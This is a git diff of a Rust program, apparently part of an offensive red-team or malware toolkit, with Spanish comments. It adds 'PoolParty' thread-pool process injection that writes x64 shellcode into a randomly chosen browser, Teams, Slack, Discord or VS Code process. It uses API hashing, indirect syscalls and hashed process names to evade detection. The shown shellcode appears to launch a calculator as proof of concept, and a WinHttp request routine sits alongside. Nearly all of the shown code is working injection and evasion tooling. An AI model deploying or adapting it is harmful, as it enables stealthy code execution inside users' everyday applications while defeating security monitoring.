@@ -31,8 +31,50 @@ use zada_xor::techniques::evasion::execution::dynamic_call::*;
 use zada_xor::techniques::evasion::execution::execute_poolparty_shellcode::*;
 use zada_xor::techniques::evasion::execution::indirect_syscall::*;
 use zada_xor::unicode_string;
+use zada_xor::techniques::evasion::process_inyection::poolparty_inyect_random_process::*;
 
 fn main() {
+
+    let dll_name_ole32 = unicode_string!("ole32.dll");
+    let mut ole32_handle: HANDLE = std::ptr::null_mut();
+
+    match ldr_load_dll(
+        0 as PCWSTR,
+        0 as PULONG,
+        &dll_name_ole32,
+        &mut ole32_handle as PHANDLE,
+    ) {
+        Ok(h) => h,
+        Err(e) => {
+            println!("Error al cargar la DLL: {}", e);
+            return;
+        }
+    };
+    println!(
+        "ole32.dll cargada exitosamente. Handle: {:?}",
+        ole32_handle
+    );
+
+        //msedge.exe, chrome.exe, firefox.exe, Teams.exe, Slack.exe, Discord.exe, Code.exe 
+
+    let hashed_process_names = vec![0xe62d4207, 0x12fcf148, 0xcab1b513, 0x3a473660, 0xb7f73985, 0x9ca920d1, 0xe68c7ba9];
+
+    
+    let bytes_to_write: &[u8] = &[
+        0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63,
+        0x54, 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48,
+        0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
+        0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24,
+        0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45,
+        0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7,
+        0x6A, 0x01, 0x5A, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59,
+        0x58, 0xC3,
+    ];
+    match poolparty_inyect_random_process(hashed_process_names, bytes_to_write){
+        Ok(_) => println!("[+] Poolparty ejecutado exitosamente en un proceso aleatorio."),
+        Err(e) => println!("[!] Poolparty error: {}", e),
+    };
+
     let dll_name = unicode_string!("WinHttp.dll");
     let mut winhttp_handle: HANDLE = std::ptr::null_mut();
 
@@ -49,6 +91,8 @@ fn main() {
         }
     };
 
+    
+
     println!(
         "WinHttp.dll cargada exitosamente. Handle: {:?}",
         winhttp_handle
@@ -64,7 +108,7 @@ fn main() {
     ) {
         Ok(data) => {
             println!("[+] net_req_and_response éxito! Recibidos {} bytes", data.len());
-            let preview = String::from_utf8_lossy(&data[..data.len()]);
+            let preview = String::from_utf8_lossy(&data[..data.len().min(100)]);
             println!("[+] Preview:\n{}", preview);
         }
         Err(e) => println!("[-] net_req_and_response error: {}", e),
@@ -78,32 +122,18 @@ fn main() {
     let winhttp = unsafe { get_winhttp_base() };
 
     println!("WinHttp.dll: {:?}", winhttp);
-    println!("Hash WinHttpOpen: {:#x}", unique_hash("WinHttpOpen"));
-    println!("Hash WinHttpConnect: {:#x}", unique_hash("WinHttpConnect"));
-    println!(
-        "Hash WinHttpOpenRequest: {:#x}",
-        unique_hash("WinHttpOpenRequest")
-    );
-    println!(
-        "Hash WinHttpSendRequest: {:#x}",
-        unique_hash("WinHttpSendRequest")
-    );
-    println!(
-        "Hash WinHttpReceiveResponse: {:#x}",
-        unique_hash("WinHttpReceiveResponse")
-    );
-    println!(
-        "Hash WinHttpQueryHeaders: {:#x}",
-        unique_hash("WinHttpQueryHeaders")
-    );
-    println!(
-        "Hash WinHttpCloseHandle: {:#x}",
-        unique_hash("WinHttpCloseHandle")
-    );
-    println!(
-        "Hash WinHttpReadData: {:#x}",
-        unique_hash("WinHttpReadData")
-    );
+
+    //msedge.exe, chrome.exe, firefox.exe, Teams.exe, Slack.exe, Discord.exe, Code.exe 
+
+    println!("Hash coInitializeEx: {:#x}", unique_hash("coInitializeEx"));
+    print!("Hash chrome.exe: {:#x}", unique_hash("chrome.exe"));
+    print!("Hash firefox.exe: {:#x}", unique_hash("firefox.exe"));
+    println!("Hash Teams.exe: {:#x}", unique_hash("Teams.exe"));
+    println!("Hash Slack.exe: {:#x}", unique_hash("Slack.exe"));
+    println!("Hash Discord.exe: {:#x}", unique_hash("Discord.exe"));
+    println!("Hash Code.exe: {:#x}", unique_hash("Code.exe"));
+
+
 
     match get_process_table() {
         Ok(table) => println!("{}", table),
@@ -130,7 +160,6 @@ fn main() {
         0x6A, 0x01, 0x5A, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59,
         0x58, 0xC3,
     ];
-    */
 
     let bytes_to_write: &[u8] = &[
         0x53, 0x56, 0x57, 0x55, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x89, 0xE5,
@@ -151,6 +180,9 @@ fn main() {
         0x45, 0x30, 0x45, 0x31, 0xC9, 0xFF, 0xD0, 0x48, 0x89, 0xEC, 0x41, 0x5F, 0x41, 0x5E, 0x41,
         0x5D, 0x41, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3,
     ];
+    */
+
+    
 
     let handle = match open_process(
         pid,
